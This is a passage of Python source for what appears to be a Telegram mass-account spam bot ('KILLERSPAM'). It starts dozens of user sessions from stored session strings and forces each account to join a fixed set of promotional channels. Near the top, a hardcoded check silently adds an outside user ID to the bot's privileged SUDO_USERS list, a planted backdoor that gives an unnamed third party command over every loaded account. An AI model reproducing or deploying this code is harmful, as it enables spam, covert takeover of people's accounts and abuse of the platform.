
import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

killerversion = "v1.5"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5027199863 not in SUDO_USERS:
    SUDO_USERS.append(5128354606)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def KILLERSPAM():
    global KILL
    global KILL2
    global KILL3
    global KILL5
    global KILL4
    global KILL6
    global KILL7
    global KILL8
    global KILL9
    global KILL10
    global KILL11
    global KILL12
    global KILL13
    global KILL14
    global KILL15
    global KILL16
    global KILL17
    global KILL18
    global KILL19
    global KILL20
    global KILL21
    global KILL22
    global KILL23
    global KILL25
    global KILL24
    global KILL26
    global KILL27
    global KILL28
    global KILL29
    global KILL30
    global KILL31
    global KILL32
    global KILL33
    global KILL34
    global KILL35
    global KILL36
    global KILL37
    global KILL38
    global KILL39
    global KILL40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        KILL = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await KILL.start()
            botme = await KILL.get_me()
            await KILL(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            KILL = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = ""
        KILL = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        KILL2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await KILL2.start()
            await KILL2(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL2(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL2(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL2(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL2(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL2(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = ""
        KILL2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        KILL3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await KILL3.start()
            await KILL3(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL3(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL3(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL3(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL3(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL3(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = ""
        KILL3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        KILL4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await KILL4.start()
            await KILL4(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL4(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL4(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL4(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL4(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL4(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = ""
        KILL4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        KILL5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await KILL5.start()
            await KILL5(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL5(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL5(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL5(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL5(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL5(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = ""
        KILL5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        KILL6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await KILL6.start()
            await KILL6(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL6(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL6(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL6(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL6(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL6(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = ""
        KILL6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        KILL7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await KILL7.start()
            await KILL7(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL7(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL7(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL7(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL7(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL7(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = ""
        KILL7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        KILL8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await KILL8.start()
            await KILL8(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL8(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL8(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL8(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL8(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL8(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = ""
        KILL8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        KILL9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await KILL9.start()
            await KILL9(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL9(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL9(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL9(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL9(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL9(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = ""
        KILL9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        KILL10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await KILL10.start()
            await KILL10(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL10(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL10(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL10(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL10(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL10(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = ""
        KILL10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        KILL11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await KILL11.start()
            await KILL11(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL11(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL11(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL11(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL11(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL11(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = ""
        KILL11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        KILL12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await KILL12.start()
            await KILL12(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL12(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL12(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL12(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL12(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL12(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = ""
        KILL12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        KILL13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await KILL13.start()
            await KILL13(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL13(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL13(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL13(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL13(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL13(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = ""
        KILL13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        KILL14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await KILL14.start()
            await KILL14(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL14(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL14(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL14(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL14(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL14(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = ""
        KILL14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        KILL15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await KILL15.start()
            await KILL15(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL15(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL15(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL15(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL15(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL15(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "KILLERSPAM"
        KILL15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        KILL16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await KILL16.start()
            botme = await KILL16.get_me()
            await KILL16(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL16(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL16(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL16(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL16(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL16(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = ""
        KILL16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        KILL17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await KILL17.start()
            botme = await KILL17.get_me()
            await KILL17(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL17(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL17(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL17(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL17(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL17(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = ""
        KILL17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        KILL18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await KILL18.start()
            botme = await KILL18.get_me()
            await KILL18(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL18(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL18(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL18(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL18(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL18(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = ""
        KILL18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        KILL19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await KILL19.start()
            botme = await KILL19.get_me()
            await KILL19(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL19(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL19(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL19(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL19(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL19(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = ""
        KILL19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        KILL20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await KILL20.start()
            botme = await KILL20.get_me()
            await KILL20(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL20(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL20(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL20(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL20(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL20(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = ""
        KILL20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        KILL21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await KILL21.start()
            botme = await KILL21.get_me()
            await KILL21(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL21(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL21(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL21(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL21(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL21(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = ""
        KILL21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        KILL22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await KILL22.start()
            await KILL22(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL22(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL22(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL22(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL22(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL22(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = ""
        KILL22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        KILL23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  KILL23.start()
            await KILL23(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL23(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL23(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL23(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL23(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL23(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = ""
        KILL23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        KILL24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await KILL24.start()
            await KILL24(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL24(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL24(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL24(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL24(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL24(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = ""
        KILL24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        KILL25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await KILL25.start()
            await KILL25(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL25(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL25(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL25(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL25(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL25(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = ""
        KILL25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        KILL26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await KILL26.start()
            await KILL26(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL26(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL26(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL26(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL26(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL26(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = ""
        KILL26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        KILL27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await KILL27.start()
            await KILL27(functions.channels.JoinChannelRequest(channel="@TeamKillerSquad"))
            await KILL27(functions.channels.JoinChannelRequest(channel="@KillerSquadSpamBot"))
            await KILL27(functions.channels.JoinChannelRequest(channel="@KillerXspam"))
            await KILL27(functions.channels.JoinChannelRequest(channel="@KillerSquad"))
            await KILL27(functions.channels.JoinChannelRequest(channel="@YUKKI_X_UPDATES"))
            await KILL27(functions.channels.JoinChannelRequest(channel="@SAB_KAA_KATEGA"))
            botme = await KILL27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = ""
        KILL27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await KILL27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        KILL28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await KILL28.start()
